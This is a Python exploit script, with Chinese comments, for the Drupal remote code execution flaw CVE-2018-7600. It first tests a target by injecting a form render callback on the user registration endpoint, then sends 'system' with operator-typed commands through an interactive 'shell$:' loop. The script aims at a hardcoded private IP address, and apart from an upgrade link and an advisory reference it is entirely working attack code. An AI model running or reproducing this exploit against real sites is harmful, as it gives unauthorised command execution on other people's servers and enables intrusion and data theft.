# -*- coding:utf-8 -*-
#Exec python3
#Drupal 6,7,8多个子版本存在远程代码执行漏洞(CVE-2018-7600）
###升级到最新版本：https://www.drupal.org/project/drupal/releases/9.0.2
###参考：https://cert.360.cn/warning/detail?id=3d862f150b642421c087b0493645b745

import requests
import time
import string
import random

def random_string(stringLength):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))
def check_drupal_8(url_dir,string_reve):
    target_url = url_dir + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
    payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'sprintf','mail[#type]': 'markup', 'mail[#markup]': string_reve }
    res = requests.post(url=target_url, data=payload, timeout=3, verify=False)
    if string_reve in res.text:
        return True
    else:
        return False

def exploit_drupal_8(url_dir, cmd):
    target_url = url_dir + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
    payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'system','mail[#type]': 'markup', 'mail[#markup]': cmd}
    res = requests.post(url=target_url, data=payload, timeout=3, verify=False)
    print(res.text.split('[')[0])
def verify(protol, ip, port):
    ip = ip.strip()
    if port.strip():
        url_dir = protol.strip() + "://" + ip + ":" + port.strip()
    else:
        url_dir = protol.strip() + "://" + ip
    stringLength = 50
    string_reve = random_string(stringLength)
    try:
        if check_drupal_8(url_dir,string_reve):
            print("----------------[+] Find Drupal CVE-2018-7600 Vuln!。Iuput [exit] to out! [+]----------------")
            while 1:
                cmd = str(input("shell$: ")).strip()
                if cmd == "exit":
                    exit(1)
                else:
                    exploit_drupal_8(url_dir, cmd)
    except Exception as e:
        msg = "[-] Not Drupal CVE-2018-7600 Vuln!"
        return False,url_dir,msg

if __name__ == '__main__':
    ip = "192.168.43.90"
    verify("http", ip, "8081")
